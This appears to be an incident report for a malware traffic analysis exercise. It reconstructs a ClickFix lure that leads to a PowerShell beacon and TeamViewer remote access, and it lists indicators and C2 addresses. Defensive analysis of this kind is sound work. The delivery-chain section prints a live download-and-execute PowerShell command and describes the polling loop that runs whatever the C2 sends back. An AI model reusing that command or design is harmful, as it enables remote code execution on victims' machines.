# Incident Report — MTA 2025-01-22 Traffic Analysis Exercise

## Victim host

| Field | Value | Evidence |
|---|---|---|
| IPv4 | **10.1.17.215** | Sole local host generating suspicious traffic; DHCP client |
| MAC | **00:d0:b7:26:4a:74** | ARP/Ethernet source bound to 10.1.17.215 throughout capture |
| Hostname | **DESKTOP-L8C5GSJ** | DHCP option 12, LLMNR self-query, NBNS `<00>`/`<20>` registrations |
| AD domain | BLUEMOONTUESDAY (bluemoontuesday.com), DC `win-gsh54qlw48d.bluemoontuesday.com` at 10.1.17.2 | SRV/A queries to DC at frame 7–13, dynamic DNS update from 10.1.17.215 |
| Logged-in user | **shutchenson** | Kerberos `CNameString` (AS-REQ/TGS-REQ from 10.1.17.215; machine account `desktop-l8c5gsj$` also present, distinct from the human account) |

## Malware family / attribution

**Attribution confidence: behavioral, not signature-confirmed** (no IDS/Suricata alerts were provided with this evidence set).

The infection is a **ClickFix-style fake-verification lure** that tricks the user into pasting an `mshta`/PowerShell command into the Windows Run dialog, which pulls down a PowerShell loader that beacons to its C2 using the endpoint's disk volume serial number as a bot ID, then deploys a legitimate, repackaged **TeamViewer** install for hands-on-keyboard remote access. This chain (volume-serial bot ID in the beacon URI, `IEX` polling loop, TeamViewer/AnyDesk-style RMM abuse for follow-on access) is consistent with publicly reported ClickFix→RAT-deployment campaigns; I am not asserting a specific named family (e.g. Matanbuchus) since no signature or hash match was available to confirm it in this exercise — call it **behavioral: ClickFix loader → PowerShell RAT/beacon → legitimate TeamViewer for remote-hands access**.

### Delivery chain (reconstructed from DNS/HTTP timing)
1. `t=38.19s` — DNS query `google-authenticator.burleson-appliance.net` (likely a compromised legitimate site acting as a redirector/lure page).
2. `t=38.86s` — DNS query `authenticatoor.org`, then TLS session to `82.221.136.26` with SNI `authenticatoor.org` — the fake CAPTCHA/"verify you are human" ClickFix page that puts a malicious command on the clipboard for the user to paste into Run.
3. `t=52.29s` — DNS query `appointedtimeagriculture.com` (second lure/redirector domain seen in the chain).
4. `t=60.30s` — `GET http://5.252.153.241/api/file/get-file/264872` retrieves an HTA/VBScript wrapper (`<component><script language="VBScript">`) that launches hidden PowerShell to open a decoy tab (`azure.microsoft.com`) while silently running `IEX (New-Object Net.WebClient).DownloadString('http://5.252.153.241:80/api/file/get-file/29842.ps1')`.
5. `29842.ps1` / `pas.ps1` (identical obfuscated Base64 payload, decoded): reads the C: volume serial number, builds `http://5.252.153.241/<serial>` as its bot ID URL, and enters an infinite loop: `DownloadString($url)` → `Invoke-Expression $result` → `Start-Sleep 5`. This is the beacon seen as the repeating `GET /1517096937` requests (every ~5.2s) for the rest of the capture.
6. `t≈125s` — C2 issues a PowerShell command (captured HTTP response body) that downloads `TeamViewer.exe`, `Teamviewer_Resource_fr.dll`, `TV.dll`, and `pas.ps1` into `C:\ProgramData\huo\`, then calls `Create-Shortcut` to place a shortcut to `TeamViewer.exe` in the user's Startup folder for persistence.
7. `t=129.21s` — beacon check-in confirms: `GET /1517096937?k=message = startup shortcut created; status = success;`
8. `t=881.89s` — beacon check-in confirms a later stage: `GET /1517096937?k=script: RunRH, status: OK, message: PS process started`.
9. From roughly `t=889s` onward, a large (~9.7 MB, 1720s-long) TLS session opens to `45.125.66.32:2917` — self-signed certificate (CN `45.125.66.32:`), never DNS-resolved (hardcoded IP), non-standard port. This is the operator's live hands-on-keyboard/C2 channel used after TeamViewer/RAT deployment. A second, shorter-lived TLS session to `45.125.66.252:443` was also observed.
